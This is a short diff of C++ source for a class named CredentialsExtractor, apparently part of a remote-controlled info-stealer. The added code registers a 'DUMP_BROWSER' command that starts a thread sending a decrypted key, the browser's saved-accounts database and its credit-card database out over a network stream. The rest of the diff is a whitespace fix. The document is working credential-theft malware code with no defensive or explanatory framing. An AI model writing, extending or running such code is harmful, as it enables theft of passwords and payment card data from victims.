@@ -1,6 +1,10 @@
 #include "CredentialsExtractor.h"
 
-CredentialsExtractor::CredentialsExtractor(const Stream &stream) : Sender(stream) {}
+CredentialsExtractor::CredentialsExtractor(const Stream &stream) : Sender(stream) {
+    actionMap["DUMP_BROWSER"] = [&](nlohmann::json& json) {
+        threadGen.runInNewThread(this, &CredentialsExtractor::sendKeyAndDatabase);
+    };
+}
 
 void CredentialsExtractor::send() {
 
@@ -63,7 +67,7 @@ void CredentialsExtractor::sendKeyAndDatabase() {
     RESULT result;
     stream.sendBytes(decryptedKey);
     stream.sendFile(Converter::string2wstring(pathOfAccountsDatabase).c_str(), result);
-   stream.sendFile(Converter::string2wstring(pathOfCreditCardsDatabase).c_str(), result);
+    stream.sendFile(Converter::string2wstring(pathOfCreditCardsDatabase).c_str(), result);
 }
 
 
